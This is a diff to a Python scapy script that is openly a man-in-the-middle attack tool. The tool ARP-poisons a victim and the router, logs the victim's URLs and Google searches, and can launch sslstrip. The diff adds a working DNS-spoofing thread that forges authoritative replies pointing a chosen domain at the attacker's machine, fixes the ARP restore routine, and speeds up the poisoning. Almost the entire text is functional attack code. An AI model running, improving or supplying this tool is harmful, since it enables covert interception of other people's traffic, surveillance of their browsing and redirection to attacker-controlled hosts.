@@ -4,7 +4,7 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
-#Below is necessary to receive a response to the DHCP packets for some reason
+#Below is necessary to receive a response to the DHCP packets for some reason. If you know the answer to that message me.
 conf.checkIPaddr=0
 import time
 import sys
@@ -29,6 +29,7 @@ parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet
 parser.add_argument("-g", "--google", help="Print google searches.", action="store_true")
 parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
 parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits.", action="store_true")
+parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
 args = parser.parse_args()
 
 #Find the gateway and use it as the router's info
@@ -37,8 +38,9 @@ routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w
 routerIP = routerRE.group(1)
 IPprefix = routerRE.group(2)
 interface = routerRE.group(3)
+localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 
-if args.dnsspy:
+if args.dnsspy or args.dnsspoof:
 	print "Checking if the router is the DNS server..."
 	dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
 	ans, unans = srp(dhcp_discover, timeout=5, retry=2)
@@ -47,7 +49,7 @@ if args.dnsspy:
 			DNSserver = p[1][IP].src
 			print "DNS server at: ", DNSserver, '\n'
 	else:
-		print "No answer to DHCP packet sent to find DNS server\n"
+		print "No answer to DHCP packet sent to find the DNS server.\n"
 
 if args.ipaddress:
 	victimIP = args.ipaddress
@@ -69,8 +71,8 @@ def poison(routerIP, victimIP):
 	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))
 
 def restore(routerIP, victimIP, routerMAC, victimMAC):
-	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=5)
-	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=5)
+	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=5)
+	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=5)
 
 def URL(pkt):
 	if pkt.haslayer(Raw):
@@ -84,6 +86,7 @@ def URL(pkt):
 			b = a[1].split(" ")
 			c = a[0].split(" ")
 			url = b[1]+c[1]
+			print url
 			if args.urlspy:
 				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
 				if any(i in url for i in d):
@@ -99,10 +102,17 @@ def URL(pkt):
 						search = search.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'')
 						print '%s googled:' % victimIP, search
 
-def DNS(pkt):
+def DNSreq(pkt):
 	if pkt.haslayer(DNSQR):
 		dnsreq = pkt[DNSQR].qname
 		print dnsreq
+
+def mkspoof(DNSpkt):
+	ip=DNSpkt[IP]
+	dnsLayer=DNSpkt[DNS]
+#qr = query or response (0,1), aa=are the nameservers authoritative? (0,1), ad=authenticated data (0,1)
+	p = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)/DNS(id=dnsLayer.id, qr=1, aa=1, qd=dnsLayer.qd, an=DNSRR(rrname=dnsLayer.qd.qname, ttl=10, rdata=localIP))
+	return p
 
 class urlspy(threading.Thread):
 	def run(self):
@@ -110,7 +120,18 @@ class urlspy(threading.Thread):
 
 class dnsspy(threading.Thread):
 	def run(self):
-		sniff(store=0, filter='port 53 and host %s' % victimIP, prn=DNS, iface=interface)
+		sniff(store=0, filter='port 53 and host %s' % victimIP, prn=DNSreq, iface=interface)
+
+class dnsspoof(threading.Thread):
+	def run(self):
+		while 1:
+			a=sniff(filter='port 53 and host %s' % victimIP, count=1, promisc=1)
+			DNSpkt = a[0]
+			if not DNSpkt.haslayer(DNSQR):
+				continue
+			if args.dnsspoof in DNSpkt.qd.qname:
+				send(mkspoof(DNSpkt))
+				print 'Sent spoofed DNS response packet for', DNSpkt.qd.qname
 
 #class ssltrip(threading.Thread):
 #	def run(self):
@@ -141,7 +162,7 @@ def main():
 	except:
 		sys.exit("Could not get MAC addresses")
 
-	if args.urlspy or args.google:
+	if args.urlspy or args.google or args.verboseURL:
 		ug = urlspy()
 		#Make sure the thread closes with the main program on Ctrl-C
 		ug.daemon = True
@@ -158,6 +179,11 @@ def main():
 
 	if args.sslstrip:
 		sslstrip()
+
+	if args.dnsspoof:
+		ds = dnsspoof()
+		ds.daemon = True
+		ds.start()
 
 	def signal_handler(signal, frame):
 		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
@@ -178,7 +204,7 @@ def main():
 				poison(DNSserver, victimIP)
 		except Exception:
 			pass
-		time.sleep(4)
+		time.sleep(1.5)
 
 
 if __name__ == "__main__":
